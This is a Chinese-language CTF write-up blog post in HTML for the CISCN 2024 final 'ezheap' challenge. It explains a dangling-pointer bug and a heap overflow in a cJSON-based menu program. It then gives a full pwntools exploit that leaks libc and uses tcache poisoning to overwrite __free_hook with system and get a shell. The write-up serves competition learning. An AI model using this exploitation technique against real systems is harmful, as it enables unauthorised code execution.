@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon_io/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon_io/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon_io/favicon-16x16.png">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://google-fonts.mirrors.sjtug.sjtu.edu.cn/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"www.cameudis.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="第一次来到国赛决赛，可惜没发挥好一道PWN都没打出来，所以结束以后努力把几道不算太离谱的题目复现一下。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【Pwn-0x18】CISCN-Final2024-writeup">
+<meta property="og:url" content="https://www.cameudis.com/Tech/PWN/5622fd1e6148.html">
+<meta property="og:site_name" content="Cameudis&#39;s Homepage">
+<meta property="og:description" content="第一次来到国赛决赛，可惜没发挥好一道PWN都没打出来，所以结束以后努力把几道不算太离谱的题目复现一下。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pic.imgdb.cn/item/669fbbd0d9c307b7e92a4b4d.png">
+<meta property="article:published_time" content="2024-07-23T15:50:11.000Z">
+<meta property="article:modified_time" content="2024-07-23T15:52:24.649Z">
+<meta property="article:author" content="Cameudis">
+<meta property="article:tag" content="blog">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.imgdb.cn/item/669fbbd0d9c307b7e92a4b4d.png">
+
+<link rel="canonical" href="https://www.cameudis.com/Tech/PWN/5622fd1e6148.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>【Pwn-0x18】CISCN-Final2024-writeup | Cameudis's Homepage</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Cameudis's Homepage</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Exp10re the W0r1d</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-notes">
+
+    <a href="/notes/" rel="section"><i class="fa fa-sticky-note fa-fw"></i>notes</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/link/" rel="section"><i class="fa fa-link fa-fw"></i>links</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/PWN/5622fd1e6148.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/ava1.jpg">
+      <meta itemprop="name" content="Cameudis">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Cameudis's Homepage">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          【Pwn-0x18】CISCN-Final2024-writeup
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2024-07-23 23:50:11 / Modified: 23:52:24" itemprop="dateCreated datePublished" datetime="2024-07-23T23:50:11+08:00">2024-07-23</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Tech/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/Tech/PWN/5622fd1e6148.html" class="post-meta-item leancloud_visitors" data-flag-title="【Pwn-0x18】CISCN-Final2024-writeup" title="Views">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/Tech/PWN/5622fd1e6148.html#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/Tech/PWN/5622fd1e6148.html" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>第一次来到国赛决赛，可惜没发挥好一道PWN都没打出来，所以结束以后努力把几道不算太离谱的题目复现一下。</p>
+<span id="more"></span>
+
+<h2 id="ezheap"><a href="#ezheap" class="headerlink" title="ezheap"></a>ezheap</h2><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>程序环境为 <code>2.31</code>，二进制保护全开：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec ./ezheap</span><br><span class="line">[*] <span class="string">&#x27;/home/cameudis/ctf/ciscn2024-final/ezheap/ezheap&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
+
+<p>程序在读入用户输入后，马上就进行了神秘的解析操作。遇到这种情况，我们有以下解决方案：</p>
+<ol>
+<li>盲猜是 JSON（确实是 JSON）</li>
+<li>求助具有丰富逆向经验的队友，发现使用了 cJSON 库</li>
+<li>使用提前准备的签名进行匹配，如下图所示：</li>
+</ol>
+<p><img src="https://pic.imgdb.cn/item/669fbbd0d9c307b7e92a4b4d.png" alt="cJSON Signature Match"></p>
+<p>关于 Binary Ninja 如何制作与匹配二进制签名，可以参考 <a target="_blank" rel="noopener" href="https://docs.binary.ninja/dev/annotation.html#exporting-a-header">官方文档</a>。</p>
+<p>除了神秘的解析之外，本题就是一个入门级菜单堆题。漏洞点有两个：</p>
+<ul>
+<li>Delete 函数中存在 dangling pointer（指针未清零）；</li>
+<li>Modify 函数中存在任意大小溢出；</li>
+</ul>
+<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>由于 new 函数中对堆块大小做了 0x400 的限制，且一共只能分配 7 个堆块，因此如果想要泄露 libc 地址，需要通过溢出把堆块 size 改大，来把堆块 free 进 unsorted bin 中。</p>
+<p>在此以后，直接 view 还拿不到 libc 地址。由于 cJSON 的实现，在解析用户的指令时，它会申请一系列的堆块。由于刚刚释放进 unsorted bin 的堆块足够大，所以它会被切割数次，导致原来位置上不再是一个指向 unsorted bin 的指针。</p>
+<p>但这种情况也很好解决，堆上还有很多遗留的地址，可以先 edit 然后顺带把地址给读出来。（感谢 V3rdant 师傅）</p>
+<p>之后就是使用 tcache poisoning 来将 <code>__free_hook</code> 劫持为 <code>system</code>，然后执行 <code>free(&quot;/bin/sh&quot;)</code> 来拿到 shell 了。</p>
+<h3 id="EXP-script"><a href="#EXP-script" class="headerlink" title="EXP script"></a>EXP script</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------- Environment Config ---------------- #</span></span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc_name = <span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">libc = ELF(libc_name)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line">context.binary = filename</span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------- Exploitation ------------------- #</span></span><br><span class="line"></span><br><span class="line">ru  = <span class="keyword">lambda</span> a:     io.recvuntil(a)</span><br><span class="line">r   = <span class="keyword">lambda</span> :      io.recv()</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b:   io.sendlineafter(a,b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b:   io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:     io.sendline(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:     io.send(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#123;&quot;choice&quot;:&quot;add&quot;,&quot;index&quot;:0,&quot;length&quot;:16,&quot;message&quot;:&quot;aaa&quot;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">comm</span>(<span class="params">choice, index, length, message</span>):</span><br><span class="line">    ru(<span class="string">b&quot;Please input:&quot;</span>)</span><br><span class="line">    s(<span class="string">f&#x27;&#123;&#123;&quot;choice&quot;:&quot;<span class="subst">&#123;choice&#125;</span>&quot;,&quot;index&quot;:<span class="subst">&#123;index&#125;</span>,&quot;length&quot;:<span class="subst">&#123;length&#125;</span>,&quot;message&quot;:&quot;&#x27;</span>.encode()+message+<span class="string">&#x27;&quot;&#125;\n&#x27;</span>.encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length, message</span>):</span><br><span class="line">    comm(<span class="string">&quot;new&quot;</span>, <span class="number">0</span>, length, message)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    comm(<span class="string">&quot;rm&quot;</span>, index, <span class="number">0</span>, <span class="string">b&quot;a&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">index</span>):</span><br><span class="line">    comm(<span class="string">&quot;view&quot;</span>, index, <span class="number">0</span>, <span class="string">b&quot;a&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, length, message</span>):</span><br><span class="line">    comm(<span class="string">&quot;modify&quot;</span>, index, length, message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x40</span>, <span class="string">b&#x27;im_block_0&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x40</span>, <span class="string">b&#x27;im_block_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overflow block_1&#x27;s size to 0x531 (thus next_chunk is top chunk)</span></span><br><span class="line">    edit(<span class="number">0</span>, <span class="number">0x2a0</span>, <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x298</span> + <span class="string">b&#x27;\x31\x05&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># unsorted bin</span></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak libc address</span></span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0xa8</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xa8</span>)</span><br><span class="line">    view(<span class="number">1</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xa8</span>)</span><br><span class="line">    libc_base = u64(ru(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))-<span class="number">0x1ecbe0</span></span><br><span class="line">    log.info(<span class="string">f&#x27;libc_base: <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># tcache poisoning</span></span><br><span class="line">    add(<span class="number">0x40</span>, <span class="string">b&#x27;im_block_2&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x90</span>, <span class="string">b&#x27;im_block_3&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x90</span>, <span class="string">b&#x27;im_block_4&#x27;</span>)</span><br><span class="line">    delete(<span class="number">4</span>)</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="number">0x2a8</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2a0</span> + pack(libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>])[:<span class="number">6</span>])</span><br><span class="line">    add(<span class="number">0x90</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x90</span>, pack(libc_base+libc.sym[<span class="string">&quot;system&quot;</span>])[:<span class="number">6</span>])</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------ Infrastructure ------------------ #</span></span><br><span class="line"></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Cameudis&#x27;s PWN Framework&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">1</span>:</span><br><span class="line">        io = gdb.debug(filename, gdbscript=gdbscript, exe=filename)</span><br><span class="line">    <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;d&quot;</span>:</span><br><span class="line">        io = process(filename)</span><br><span class="line">    <span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">        io = remote(ip, port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: ./exp.py [d | r]&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\td for direct without debug&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\tr for remote&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/Tech/PWN/576345e2f0f6.html" rel="prev" title="【Pwn-0x17】BlackHatMEA2023-House-of-Minho-writeup">
+      <i class="fa fa-chevron-left"></i> 【Pwn-0x17】BlackHatMEA2023-House-of-Minho-writeup
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ezheap"><span class="nav-number">1.</span> <span class="nav-text">ezheap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="nav-number">1.2.</span> <span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP-script"><span class="nav-number">1.3.</span> <span class="nav-text">EXP script</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Cameudis"
+      src="/images/ava1.jpg">
+  <p class="site-author-name" itemprop="name">Cameudis</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">66</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/cameudis" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;cameudis" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:cameudis@gmail.com" title="E-Mail → mailto:cameudis@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://x.com/cameudis" title="Twitter → https:&#x2F;&#x2F;x.com&#x2F;cameudis" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-dove"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Cameudis</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'Ji5y9HTOlb2QGDO0XFlWXNRy-gzGzoHsz',
+      appKey     : '6VqGye1352LX381YQDTOaiXs',
+      placeholder: "El Psy Congroo",
+      avatar     : 'retro',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+    </div>
+</body>
+</html>
